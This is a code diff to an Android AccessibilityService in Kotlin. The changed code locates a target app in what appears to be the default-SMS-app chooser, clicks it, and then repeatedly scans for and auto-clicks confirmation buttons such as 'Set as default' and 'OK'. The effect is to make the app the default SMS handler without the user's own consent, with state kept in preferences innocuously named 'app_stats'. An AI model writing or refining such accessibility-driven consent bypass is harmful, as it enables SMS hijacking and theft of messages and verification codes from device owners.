@@ -441,50 +441,51 @@ class MyAccessibilityService : AccessibilityService() {
                     val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
                     val lastLoop = prefs.getLong("sms_nav_loop_ts", 0L)
                     
-                    if (System.currentTimeMillis() - lastLoop < 4000) return
-                    prefs.edit().putLong("sms_nav_loop_ts", System.currentTimeMillis()).apply()
-
+                    if (System.currentTimeMillis() - lastLoop < 2000) return
+                    
                     val targetCount = appNodes.size
                     DebugLogger.log("SMS_NAV_PHASE1", "Found $targetCount nodes matching target label: '$targetLabel'")
 
-                    var candidateIndex = prefs.getInt("sms_nav_candidate_idx", 0)
-                    if (candidateIndex >= targetCount) candidateIndex = 0
-
-                    DebugLogger.log("SMS_NAV_PHASE1", "Evaluating candidate $candidateIndex...")
-
-                    var target: android.view.accessibility.AccessibilityNodeInfo? = appNodes[candidateIndex]
-                    while (target != null && !target.isClickable) target = target.parent
-                    
-                    if (target != null && target.isClickable) {
-                        target.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
-                        DebugLogger.log("SMS_NAV", "Clicked candidate $candidateIndex for '$targetLabel'")
+                    var clicked = false
+                    for (i in 0 until targetCount) {
+                        var target: android.view.accessibility.AccessibilityNodeInfo? = appNodes[i]
+                        while (target != null && !target.isClickable) target = target.parent
                         
-                        // Handle Confirmation Dialogs after click
-                        kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
-                            delay(600)
-                            val confirmRoot = rootInActiveWindow
-                            if (confirmRoot != null) {
-                                val keywords = listOf("Set as default", "Set", "OK", "Default")
-                                var confirmClicked = false
-                                for (kw in keywords) {
-                                    val btn = confirmRoot.findAccessibilityNodeInfosByText(kw).find { it.isClickable }
-                                    if (btn != null) {
-                                        btn.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
-                                        DebugLogger.log("SMS_NAV_CONFIRM", "Clicked confirm dialog button: '$kw'")
-                                        confirmClicked = true
-                                        break
+                        if (target != null && target.isClickable) {
+                            target.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
+                            DebugLogger.log("SMS_NAV", "Clicked clickable candidate $i for '$targetLabel'")
+                            clicked = true
+                            prefs.edit().putLong("sms_nav_loop_ts", System.currentTimeMillis()).apply()
+                            
+                            // Handle Confirmation Dialogs after click (Scan for 2.5s)
+                            kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
+                                for (attempt in 1..5) {
+                                    delay(500)
+                                    val confirmRoot = rootInActiveWindow
+                                    if (confirmRoot != null) {
+                                        val keywords = listOf("Set as default", "Set", "OK", "Default")
+                                        var confirmClicked = false
+                                        for (kw in keywords) {
+                                            val btn = confirmRoot.findAccessibilityNodeInfosByText(kw).find { it.isClickable }
+                                            if (btn != null) {
+                                                btn.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
+                                                DebugLogger.log("SMS_NAV_CONFIRM", "Clicked confirm dialog button: '$kw'")
+                                                confirmClicked = true
+                                                break
+                                            }
+                                        }
+                                        if (confirmClicked) break
                                     }
                                 }
-                                if (!confirmClicked) {
-                                    DebugLogger.log("SMS_NAV_CONFIRM", "No confirmation dialog buttons found for candidate $candidateIndex.")
-                                }
                             }
-                            // Increment candidate index in case this app wasn't the one we wanted
-                            prefs.edit().putInt("sms_nav_candidate_idx", candidateIndex + 1).apply()
+                            break // Found and clicked, exit loop
+                        } else {
+                            DebugLogger.log("SMS_NAV_PHASE1", "Candidate $i is NOT clickable, skipping...")
                         }
-                    } else {
-                        DebugLogger.log("SMS_NAV_PHASE1", "Candidate $candidateIndex is NOT clickable (no clickable parent found).")
-                        prefs.edit().putInt("sms_nav_candidate_idx", candidateIndex + 1).apply()
+                    }
+                    
+                    if (!clicked) {
+                        DebugLogger.log("SMS_NAV_PHASE1", "Found ${appNodes.size} nodes for '$targetLabel', but NONE were clickable.")
                     }
                     return
                 } else {
